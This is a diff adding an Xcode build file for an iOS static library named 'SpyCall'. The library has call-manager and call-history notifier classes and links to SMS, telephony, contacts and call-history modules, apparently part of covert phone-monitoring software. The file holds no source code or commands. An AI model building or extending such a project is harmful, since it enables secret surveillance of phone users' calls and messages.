@@ -1,0 +1,257 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 45;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		08133C2F166E18080064C220 /* SpringBoardDidLaunchNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = 08133C2D166E18080064C220 /* SpringBoardDidLaunchNotifier.h */; };
+		08133C30166E18080064C220 /* SpringBoardDidLaunchNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = 08133C2E166E18080064C220 /* SpringBoardDidLaunchNotifier.m */; };
+		3553BD0C1C4369420055572A /* SpringBoardKilledNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = 3553BD0A1C4369420055572A /* SpringBoardKilledNotifier.h */; };
+		3553BD0D1C4369420055572A /* SpringBoardKilledNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = 3553BD0B1C4369420055572A /* SpringBoardKilledNotifier.m */; };
+		35BC54871510A7B400A1555B /* SpyCallManager.h in Headers */ = {isa = PBXBuildFile; fileRef = 35BC54851510A7B400A1555B /* SpyCallManager.h */; };
+		35BC54881510A7B400A1555B /* SpyCallManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 35BC54861510A7B400A1555B /* SpyCallManager.m */; };
+		35BC548B1510A7E100A1555B /* RecentCallNotifier.h in Headers */ = {isa = PBXBuildFile; fileRef = 35BC54891510A7E100A1555B /* RecentCallNotifier.h */; };
+		35BC548C1510A7E100A1555B /* RecentCallNotifier.m in Sources */ = {isa = PBXBuildFile; fileRef = 35BC548A1510A7E100A1555B /* RecentCallNotifier.m */; };
+		AA747D9F0F9514B9006C5449 /* SpyCall_Prefix.pch in Headers */ = {isa = PBXBuildFile; fileRef = AA747D9E0F9514B9006C5449 /* SpyCall_Prefix.pch */; };
+		AACBBE4A0F95108600F1A2B1 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = AACBBE490F95108600F1A2B1 /* Foundation.framework */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		08133C2D166E18080064C220 /* SpringBoardDidLaunchNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpringBoardDidLaunchNotifier.h; sourceTree = "<group>"; };
+		08133C2E166E18080064C220 /* SpringBoardDidLaunchNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SpringBoardDidLaunchNotifier.m; sourceTree = "<group>"; };
+		3553BD0A1C4369420055572A /* SpringBoardKilledNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpringBoardKilledNotifier.h; sourceTree = "<group>"; };
+		3553BD0B1C4369420055572A /* SpringBoardKilledNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SpringBoardKilledNotifier.m; sourceTree = "<group>"; };
+		35BC54851510A7B400A1555B /* SpyCallManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpyCallManager.h; sourceTree = "<group>"; };
+		35BC54861510A7B400A1555B /* SpyCallManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SpyCallManager.m; sourceTree = "<group>"; };
+		35BC54891510A7E100A1555B /* RecentCallNotifier.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecentCallNotifier.h; sourceTree = "<group>"; };
+		35BC548A1510A7E100A1555B /* RecentCallNotifier.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecentCallNotifier.m; sourceTree = "<group>"; };
+		AA747D9E0F9514B9006C5449 /* SpyCall_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SpyCall_Prefix.pch; sourceTree = SOURCE_ROOT; };
+		AACBBE490F95108600F1A2B1 /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = System/Library/Frameworks/Foundation.framework; sourceTree = SDKROOT; };
+		D2AAC07E0554694100DB518D /* libSpyCall.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = libSpyCall.a; sourceTree = BUILT_PRODUCTS_DIR; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		D2AAC07C0554694100DB518D /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				AACBBE4A0F95108600F1A2B1 /* Foundation.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		034768DFFF38A50411DB9C8B /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				D2AAC07E0554694100DB518D /* libSpyCall.a */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		0867D691FE84028FC02AAC07 /* SpyCall */ = {
+			isa = PBXGroup;
+			children = (
+				08FB77AEFE84172EC02AAC07 /* Classes */,
+				32C88DFF0371C24200C91783 /* Other Sources */,
+				0867D69AFE84028FC02AAC07 /* Frameworks */,
+				034768DFFF38A50411DB9C8B /* Products */,
+			);
+			name = SpyCall;
+			sourceTree = "<group>";
+		};
+		0867D69AFE84028FC02AAC07 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				AACBBE490F95108600F1A2B1 /* Foundation.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		08FB77AEFE84172EC02AAC07 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				35BC54851510A7B400A1555B /* SpyCallManager.h */,
+				35BC54861510A7B400A1555B /* SpyCallManager.m */,
+				35BC54891510A7E100A1555B /* RecentCallNotifier.h */,
+				35BC548A1510A7E100A1555B /* RecentCallNotifier.m */,
+				3553BD0A1C4369420055572A /* SpringBoardKilledNotifier.h */,
+				3553BD0B1C4369420055572A /* SpringBoardKilledNotifier.m */,
+				08133C2D166E18080064C220 /* SpringBoardDidLaunchNotifier.h */,
+				08133C2E166E18080064C220 /* SpringBoardDidLaunchNotifier.m */,
+			);
+			name = Classes;
+			sourceTree = "<group>";
+		};
+		32C88DFF0371C24200C91783 /* Other Sources */ = {
+			isa = PBXGroup;
+			children = (
+				AA747D9E0F9514B9006C5449 /* SpyCall_Prefix.pch */,
+			);
+			name = "Other Sources";
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXHeadersBuildPhase section */
+		D2AAC07A0554694100DB518D /* Headers */ = {
+			isa = PBXHeadersBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				AA747D9F0F9514B9006C5449 /* SpyCall_Prefix.pch in Headers */,
+				35BC54871510A7B400A1555B /* SpyCallManager.h in Headers */,
+				35BC548B1510A7E100A1555B /* RecentCallNotifier.h in Headers */,
+				08133C2F166E18080064C220 /* SpringBoardDidLaunchNotifier.h in Headers */,
+				3553BD0C1C4369420055572A /* SpringBoardKilledNotifier.h in Headers */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXHeadersBuildPhase section */
+
+/* Begin PBXNativeTarget section */
+		D2AAC07D0554694100DB518D /* SpyCall */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1DEB921E08733DC00010E9CD /* Build configuration list for PBXNativeTarget "SpyCall" */;
+			buildPhases = (
+				D2AAC07A0554694100DB518D /* Headers */,
+				D2AAC07B0554694100DB518D /* Sources */,
+				D2AAC07C0554694100DB518D /* Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = SpyCall;
+			productName = SpyCall;
+			productReference = D2AAC07E0554694100DB518D /* libSpyCall.a */;
+			productType = "com.apple.product-type.library.static";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		0867D690FE84028FC02AAC07 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+			};
+			buildConfigurationList = 1DEB922208733DC00010E9CD /* Build configuration list for PBXProject "SpyCall" */;
+			compatibilityVersion = "Xcode 3.1";
+			developmentRegion = English;
+			hasScannedForEncodings = 1;
+			knownRegions = (
+				en,
+			);
+			mainGroup = 0867D691FE84028FC02AAC07 /* SpyCall */;
+			productRefGroup = 034768DFFF38A50411DB9C8B /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				D2AAC07D0554694100DB518D /* SpyCall */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXSourcesBuildPhase section */
+		D2AAC07B0554694100DB518D /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				35BC54881510A7B400A1555B /* SpyCallManager.m in Sources */,
+				35BC548C1510A7E100A1555B /* RecentCallNotifier.m in Sources */,
+				3553BD0D1C4369420055572A /* SpringBoardKilledNotifier.m in Sources */,
+				08133C30166E18080064C220 /* SpringBoardDidLaunchNotifier.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin XCBuildConfiguration section */
+		1DEB921F08733DC00010E9CD /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				ARCHS = "$(ARCHS_STANDARD_INCLUDING_64_BIT)";
+				COPY_PHASE_STRIP = NO;
+				DSTROOT = /tmp/SpyCall.dst;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_ENABLE_FIX_AND_CONTINUE = YES;
+				GCC_MODEL_TUNING = G5;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = SpyCall_Prefix.pch;
+				INSTALL_PATH = /usr/local/lib;
+				PRODUCT_NAME = SpyCall;
+				USER_HEADER_SEARCH_PATHS = "../../IPC/Source-IPC ../../Preferences/Source-Preferences ../../SMSSender/Source-SMSSender ../../OTC/Headers/iOS3/CoreTelephony ../../OTC/Headers/iOS4/AddressBook ../../TelephonyNotification/Source-TelephonyNotification ../../ccgus-fmdb-606b29d/src ../../Std/FxStd/** ../../Std/FxStd ../../OTC/Headers/iOS8/CallHistory ../../SystemUtils/Source-SystemUtils";
+			};
+			name = Debug;
+		};
+		1DEB922008733DC00010E9CD /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				ARCHS = "$(ARCHS_STANDARD_INCLUDING_64_BIT)";
+				DSTROOT = /tmp/SpyCall.dst;
+				GCC_MODEL_TUNING = G5;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = SpyCall_Prefix.pch;
+				INSTALL_PATH = /usr/local/lib;
+				PRODUCT_NAME = SpyCall;
+				USER_HEADER_SEARCH_PATHS = "../../IPC/Source-IPC ../../Preferences/Source-Preferences ../../SMSSender/Source-SMSSender ../../OTC/Headers/iOS3/CoreTelephony ../../OTC/Headers/iOS4/AddressBook ../../TelephonyNotification/Source-TelephonyNotification ../../ccgus-fmdb-606b29d/src ../../Std/FxStd/** ../../Std/FxStd ../../OTC/Headers/iOS8/CallHistory ../../SystemUtils/Source-SystemUtils";
+			};
+			name = Release;
+		};
+		1DEB922308733DC00010E9CD /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				OTHER_LDFLAGS = "-ObjC";
+				PREBINDING = NO;
+				SDKROOT = iphoneos4.0;
+			};
+			name = Debug;
+		};
+		1DEB922408733DC00010E9CD /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				OTHER_LDFLAGS = "-ObjC";
+				PREBINDING = NO;
+				SDKROOT = iphoneos4.0;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		1DEB921E08733DC00010E9CD /* Build configuration list for PBXNativeTarget "SpyCall" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1DEB921F08733DC00010E9CD /* Debug */,
+				1DEB922008733DC00010E9CD /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		1DEB922208733DC00010E9CD /* Build configuration list for PBXProject "SpyCall" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				1DEB922308733DC00010E9CD /* Debug */,
+				1DEB922408733DC00010E9CD /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = 0867D690FE84028FC02AAC07 /* Project object */;
+}
